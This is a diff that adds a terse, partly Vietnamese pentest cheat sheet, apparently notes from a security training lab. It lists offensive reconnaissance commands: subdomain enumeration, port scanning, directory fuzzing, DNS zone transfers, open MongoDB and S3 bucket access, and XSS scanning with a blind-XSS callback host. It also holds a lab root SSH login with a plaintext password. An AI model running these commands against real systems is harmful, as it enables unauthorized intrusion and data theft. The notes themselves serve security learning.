@@ -1,0 +1,89 @@
+1 các thanh nhập thông tin trên front-end
+2 thêm các giá trị tại back-end
+- sửa thương thức GET -> ...
+- thêm thông tin biến số &test=test
+3 gõ tìm các file có thể xảy ra trên đường dẫn
+4 Host, Header, https, another name of certificate
+
+/.git/config
+/robots.txt
+/.htaccess
+massscan
+amass enum -v -src -ip -brute -min-for-recursive 2 -d cyberjutsu.com
+subfinder
+sublist3r -v -d cyberjutsu.com
+aquatone
+----recon-ng
+marketplace search github
+marketplace info recon/domains-hosts/google_site_web
+marketplace install recon/domains-hosts/google_site_web
+modules load recon/domains-hosts/google_site_web
+info
+options set SOURCE megacorpone.com
+run
+show hosts
+-----------------------------------------------------
+ssh root@128.199.190.141 -p2223
+Password: recon_cbjslab
+nmap -T4 -A -v
+nmap -p 8008 --open 192.168.0.1/24
+rustscan -a 178.128.19.56 --range 0-65535 --ulimit 5000
+rustscan -a 127.0.0.1,0.0.0.0
+
+C:\Windows\System32\drivers\etc
+------------------------------parameters scan
+find path javascript
+gospider -s <url>
+arjun
+./arjun -u <url>
+
+-------------------------------directories
+gobuster
+ffuf ( writen by hacker )
+ffuf -H "Host: cms.cyberjutsu-lab.tech" -u http://178.128.19.56/FUZZ -w /root/wordlists/common.txt
+fuf -u https://hackycorp.com/ -w ./common.txt -H "Host: FUZZ.hackycorp.com"
+ffuf -w /root/wordlists/common.txt -u http://103.145.62.203/FUZZ -fc 403
+-e ".php"
+.php 
+.zip
+-ac  filter top famous directory
+-------------------------------------------------------
+mongo <IP>
+db.getMongo().getDBNames()
+show collections
+db.users.find()
+
+esc    ->   :wq 
+------------------------------------------------------
+searchsploit struts
+----bind
+dig +short -e chaos -t txt @"z.hackycorp.com" version.bind
+
+dig txt key.z.hackycorp.com
+(zone transfer)
+dig axfr int @z.hackycorp.com
+dnsrecon -d z.hackycorp.com -t axfr
+----------------------------------------------------
+github --> commit --> commit name  --> <url>.patch
+---------------------------------------------scan vulnerability
+nikto -h http://shop.cyberjutsu-lab.tech/ -Tuning x
+----scan directory
+nikto -h http://shop.cyberjutsu-lab.tech/ -Cgidirs all
+-----------
+FinalRecon  
+nginxpwner   --Nginx misconfigurations and vulnerabilitiesNginx misconfigurations and vulnerabilities
+nuclei    --SSTI  --https://gitbook.seguranca-informatica.pt/fuzzing-and-web/cache-poisoning-using-nuclei
+broken-link-checker
+https://github.com/anshumanpattnaik/http-request-smuggling
+JSFinderPlus    #find the sensitive info like email
+------------------------------------------------XSS
+https://anonyviet.com/cach-scan-lo-hong-xss-tu-dong-voi-dalfox/
+python paramspider.py -d têndomain -o TênFileoutput.txt
+dalfox url http://testphp.vulnweb.com:80/hpp/index.php?pp=FUZZ -b hawhul.xss.ht
+------------------------------------------------
+wpscan --url http://pentest.huyqa-home.com
+-----------------------------------------------
+aws s3 ls s3://foodhut-storage2 --no-sign-request
+aws s3 cp s3://foodhut-storage2/internal/cong-thuc-bi-mat-ga-kfc.txt
+
+https://anonyviet.com/cach-dung-reconftw-de-do-tham-mang-tim-lo-hong-bao-mat/
